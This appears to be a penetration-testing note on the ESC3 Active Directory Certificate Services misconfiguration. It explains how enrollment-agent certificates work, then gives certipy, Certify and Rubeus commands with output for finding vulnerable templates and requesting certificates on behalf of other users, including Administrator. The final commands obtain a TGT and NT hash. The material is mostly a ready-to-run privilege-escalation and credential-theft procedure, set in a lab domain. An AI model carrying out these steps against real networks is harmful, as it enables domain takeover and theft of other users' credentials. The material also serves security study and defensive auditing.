### Content

- [Overview](#overview)
	- [Requirements](#requirements)
- [From Linux](#from-linux)
	- [Linux - Enumeration](#linux---enumeration)
	- [Linux - Abuse](#linux---abuse)
- [From Windows](#from-windows)
	- [Windows - Enumeration](#windows---enumeration)
	- [Windows - Abuse](#windows---abuse)

> Template Misconfiguration. 

---
### Overview

The Certificate Request Agent EKU OID (1.3.6.1.4.1.311.20.2.1) allows a designated principal (the enrollment agent) to generate and sign a CSR on behalf of someone else, and the CA will issue the certificate as if that other person requested it themselves.

A legitimate scenario : A smart card user needs a new certificate but can't submit the request themselves, so an IT admin does it for them after verifying their identity in person.

1. The enrollment agent enrolls in a template that has the Certificate Request Agent OID in its EKU. Granting them a special certificate that is authorized to sign requests on behalf of others.
2. The enrollment agent crafts a CSR with another user as the subject and signs it using their Certificate that has the EKU Request Agent certificate. The co-signature proof to the CA that an authorized agent is vouching for this request.
3. The co-signed CSR is submitted to a CA that has a template permitting "enroll on behalf of". The CA sees the valid co-signature, trusts it, and issues the certificate.

#### Requirements

To abuse ESC3, at least two templates matching the conditions below required:

1. A first template that has:
	- The Enterprise CA grants the controlled user enrollment rights (same as `ESC1`).
	- Manager approval should be turned off (same as `ESC1`).
	- No authorized signatures are required (same as `ESC1`).
	- The `Certificate Request Agent EKU OID (1.3.6.1.4.1.311.20.2.1)`, allowing the requesting of other certificate templates on behalf of other principals.
2. A second template that has:
	- The Enterprise CA grants the controlled user enrollment rights (same as `ESC1`).
	- Manager approval should be turned off (same as `ESC1`).
	- The template schema version 1 or is greater than 2 and specifies an Application Policy Issuance Requirement that necessitates the Certificate Request Agent EKU.
	- The certificate template defines an EKU that enables domain authentication.
	- No restrictions on enrollment agents are implemented at the CA level.

---
### From Linux
#### Linux - Enumeration

```bash
$ certipy find -u 'user@lab.local' -p pass -dc-ip <IP> -vulnerable -stdout
    Template Name                       : ESC3
    Display Name                        : ESC3
    Certificate Authorities             : lab-LAB-DC-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True #<<<<<<<<<<<
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Certificate Request Agent #<<<<<<<<<<<
    Requires Manager Approval           : False #<<<<<<<<<<<
    Requires Key Archival               : False
    Authorized Signatures Required      : 0 #<<<<<<<<<<<
    Schema Version                      : 2
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-05-01T17:47:22+00:00
    Template Last Modified              : 2023-07-05T11:47:23+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Domain Users
                                          LAB.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : LAB.LOCAL\Administrator
        Full Control Principals         : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Write Owner Principals          : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Write Dacl Principals           : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Write Property Enroll           : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Domain Users
                                          LAB.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : LAB.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
```
#### Linux - Abuse

Request a certificate from a misconfigured template with (certificate request agent)

```bash
$ certipy req -u 'user@lab.local' -p 'pass' -ca 'lab-LAB-DC-CA' -template 'ESC3'
```

Request a certificate from a template that allows Client Authentication in its EKUs on behalf of any user by including the initial certificate as proof. (We can use the built-in `User` template)

```bash
$ certipy req -u user@lab.local -p pass -ca lab-LAB-DC-CA -template User -target-ip <CA_IP> -dc-ip <DC_IP> -on-behalf-of 'lab\anotherUser' -pfx user.pfx

# We can then use the resulted certificate to authenticate and get a TGT and NT hash
$ certipy auth -username anotherUser -pfx anotherUser.pfx -domain lab.local -dc-ip <IP>

# Now we can access resources as the other user
```

---
### From Windows
#### Windows - Enumeration

Using `certify.exe`

```PowerShell
PS C:\> .\Certify.exe find /vulnerable
```

Using `ActiveDirectory` module with a specific LDAP query:

```PowerShell
# !(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2) — No manager approval required
# (mspki-ra-signature=0) — No co-signatures required
# (pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.1) - Certificate Request Agent EKU

Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.1))' -SearchBase 'CN=Configuration,DC=lab,DC=local' | fl
```

#### Windows - Abuse

```PowerShell
# Request a certificate from the vulnerable template
PS C:\> .\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC3
```

Convert PEM to PFX with one of the ways specified in the note [PEM to PFX](./PEM%20to%20PFX.md) 

```PowerShell
# Request a Certificate on behalf of another user
PS C:\Tools> .\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:User /onbehalfof:LAB\Administrator /enrollcert:cert.pfx 
```

Convert PEM to PFX with one of the ways specified in the note [PEM to PFX](PEM%20to%20PFX.md) 

```PowerShell
# Use Rubeus to get the user's hash and TGT
PS C:\> .\Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /getcredentials /nowrap
```